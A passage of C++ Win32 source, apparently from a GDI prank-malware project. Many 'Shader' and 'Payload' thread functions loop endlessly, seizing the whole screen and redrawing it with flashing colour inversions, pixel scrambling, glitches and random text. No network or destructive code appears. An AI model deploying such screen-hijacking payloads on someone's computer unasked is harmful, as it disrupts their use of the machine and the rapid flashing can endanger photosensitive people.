        for (int i = 0; i < h; i++) {
            for (int j = 0; j < w; j++) {
                prgbScreen[i * w + j].r += t;
                prgbScreen[i * w + j].g -= t;
                prgbScreen[i * w + j].b += t / 25;
            }
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcTempScreen, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader14_NoName8(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD prgbScreen = { 0 };
    HDC hdcTempScreen;
    HBITMAP hbmScreen;
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    hdcTempScreen = CreateCompatibleDC(hdcScreen);
    hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
    SelectObject(hdcTempScreen, hbmScreen);
    for (int t = 0;; t++) {
        hdcScreen = GetDC(NULL);
        BitBlt(hdcTempScreen, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (int i = 0; i < h; i++) {
            for (int j = 0; j < w; j++) {
                prgbScreen[i * w + j].r += GetRValue(i * j & 5);
                prgbScreen[i * w + j].g <<= t;
                prgbScreen[i * w + j].b += GetBValue(i ^ j);
            }
        }
        for (int y = 0; y < h; y++)BitBlt(hdcTempScreen, rand() % 2 ? -1 : 1, rand() % h, w, 1, hdcTempScreen, 0, 0, SRCCOPY);
        BitBlt(hdcScreen, 0, 0, w, h, hdcTempScreen, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader15_Cube_th16a(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t++) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += 255;
                rgbquad[x + w * y].r = x + t;
                rgbquad[x + w * y].b = y + t;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload5_PigGan_th16b(LPVOID lpParam) {
    int x = 0, y = 0;
    int signX = 10, signY = 10;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int rgb = RndRGB;
        HBITMAP bmp = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_BITMAP1)), oldbmp = (HBITMAP)SelectObject(hcdc, bmp), hBrush = (HBITMAP)CreateSolidBrush(rgb), old2 = (HBITMAP)SelectObject(hcdc, hBrush);
        PatBlt(hcdc, 0, 0, 366, 677, PATINVERT);
        TransparentBlt(hdc, x, y, 183, 336, hcdc, 0, 0, 366, 677, RGB(255, 255, 255) - rgb);
        if (x + 183 >= w)signX = -10;
        if (x <= 0)signX = 10;
        if (y + 336 >= h)signY = -10;
        if (y <= 0)signY = 10;
        x += signX; y += signY;
        SelectObject(hcdc, oldbmp);
        DeleteObject(bmp);
        SelectObject(hcdc, old2);
        DeleteObject(hBrush);
        DeleteDC(hcdc);
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}
DWORD WINAPI Shader16_PoPo(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t += 10) {
        t %= 360;
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += x * y | x ^ y | x - y | x + y | x & y | x | y;
            }
        }
        int signX = 100 * cos(t * PI / 180.f), signY = 100 * sin(t * PI / 180.f);
        StretchBlt(hdc, signX, signY, w - (signX * 2), h - (signY * 2), hcdc, 0, 0, w, h, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader17_Gourd(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    PRGBQUAD rgbquad = NULL;
    hdc = GetDC(NULL); HDC hdcCopy = CreateCompatibleDC(hdc);
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                double fractalX = (2.5f / w);
                double fractalY = (1.90f / h);
                double cx = x * fractalX - 2.f;
                double cy = y * fractalY - 0.95f;
                double zx = 0;
                double zy = 0;
                int fx = 0;
                while (((zx * zx) + (zy * zy)) < 10 && fx < 50) {
                    double fczx = zx * zx - zy * zy + cx;
                    double fczy = 2 * zx * zy + cy;
                    zx = fczx;
                    zy = fczy;
                    fx++;
                    rgbquad[index].r *= fx;
                    rgbquad[index].g *= fx;
                    rgbquad[index].b *= fx;
                }
            }
        }
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload6a_XBRTri(LPVOID lpParam) {
    while (1) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h), oldbmp = (HBITMAP)SelectObject(hcdc, bmp);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        StretchBlt(hcdc, 0, 0, w / 2, h / 2, hdc, 0, 0, w, h, NOTSRCERASE);
        StretchBlt(hcdc, 0, h / 2, w / 2, h / 2, hdc, 0, 0, w, h, NOTSRCERASE);
        StretchBlt(hcdc, w / 2, h / 2, w / 2, h / 2, hdc, 0, 0, w, h, NOTSRCERASE);
        StretchBlt(hcdc, w / 2 + 10, 10, w / 2 - 20, h / 2 - 20, hdc, w / 2, 0, w / 2, h / 2, SRCPAINT);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        SelectObject(hcdc, oldbmp);
        DeleteObject(bmp);
        DeleteDC(hcdc);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload6b_Textz(LPVOID lpParam) {
    int num = 9;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int i = rand() % num;
        HDC hdc = GetDC(0);
        SetBkColor(hdc, RndRGB);
        TextOutA(hdc, rand() % w, rand() % h, texts[i], strlen(texts[i]));
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader18_Mandela(LPVOID lpParam) {
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = 40;
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = -h;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 1;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiColors[0].rgbBlue = 0;
        bmi.bmiColors[0].rgbGreen = 0;
        bmi.bmiColors[0].rgbRed = 0;
        bmi.bmiColors[0].rgbReserved = 0;
        bmi.bmiColors[1].rgbBlue = 255;
        bmi.bmiColors[1].rgbGreen = 255;
        bmi.bmiColors[1].rgbRed = 255;
        bmi.bmiColors[1].rgbReserved = 0;
        HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, 0, 0, 0);
        HBITMAP oldbmp = (HBITMAP)SelectObject(hcdc, bmp);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        SelectObject(hcdc, oldbmp);
        DeleteObject(bmp);
        DeleteDC(hcdc);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader19_NoName9(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int rgb = RndRGB;
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb -= rgb;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader20_Dark(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int rgb = GetRValue(x ^ y);
                if (rgb <= 0)rgb = 1;
                if (rgb > 2)rgb = 2;
                rgbquad[x + w * y].rgb /= rgb + 1;
            }
        }
        for (int y = 0; y < h; y++) {
            BitBlt(hcdc, rand() % 100 - 50, y, w, 1, hcdc, 0, y, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader21_RndPixel(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        PRGBQUAD tmp = rgbquad;
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y] = tmp[rand() % (w * h)];
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader22_Wrinkle(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb *= x & y;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader23_Tan(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb ^= (int)tan(x ^ y);
            }
        }
        BitBlt(hdc, rand() % 3 - 1, rand() % 3 - 1, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload7_Tan2(LPVOID lpParam) {
    float angle = 0;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h), oldbmp = (HBITMAP)SelectObject(hcdc, bmp);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            int signX = rand() % 3 - 1 + (30 * tan((angle + y) * PI / 180.f)), signX2;
            if (signX < 0)signX2 = w + signX;
            if (signX >= w)signX2 = -(signX + w);
            BitBlt(hcdc, signX, y, w, 1, hcdc, 0, y, NOTSRCERASE);
            BitBlt(hcdc, signX2, y, w, 1, hcdc, signX, y, NOTSRCERASE);
        }
        angle++;
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        SelectObject(hcdc, oldbmp);
        DeleteObject(bmp);
        DeleteDC(hcdc);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader24_NoName10(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += x | y | x << y;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader25_NoName11_th28a(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += (x ^ y | x & y) * x / 5;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload8_FrameRect_th28b(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        RECT r = { rand() % w,rand() % h,rand() % w,rand() % h };
        HBRUSH hBrush= CreateSolidBrush(Hue(239));
        FrameRect(hdc, &r, hBrush);
        DeleteObject(hBrush);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader26_RandomColor(LPVOID lpParam) {
    int screenWidth = GetSystemMetrics(0), screenHigh = GetSystemMetrics(1);
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = screenWidth;
    bmi.bmiHeader.biHeight = screenHigh;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, screenWidth, screenHigh, hdcScreen, 0, 0, SRCCOPY);
        int rgb = RndRGB;
        for (int i = 0; i < screenWidth * screenHigh; i++) {
            int gray = (rgbScreen[i].r + rgbScreen[i].g + rgbScreen[i].b) / 3;
            rgbScreen[i].rgb = RGB(gray, gray, gray);
            rgbScreen[i].rgb ^= rgb;
        }
        BitBlt(hdcScreen, 0, 0, screenWidth, screenHigh, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader27_Wrinkle2(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    RGBQUAD* rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgbRed /= 2;
            rgbScreen[i].rgbGreen /= 2;
            rgbScreen[i].rgbBlue *= 2;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader28_NoName12(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (int t = 0;; t++) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb += (x * y & x | y + i - t) / 2;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader29_NoName13(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (int t = 0;; t++) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb = t * ((x ^ y) * i + x + y);
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader30_NoName14(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb += x + w * i / (y + 1) - h;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader31_NoName15(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb += x ^ y * i - x * y - i;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader32_NoName16(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb += i * x - y * i | x & y - i ^ x;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader33_NoName17(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb += 2 * i - 114 & y / (i + 1) - x | y;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader34_NoName18(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb -= y & x | i ^ x + i * x;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader35_NoName19(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
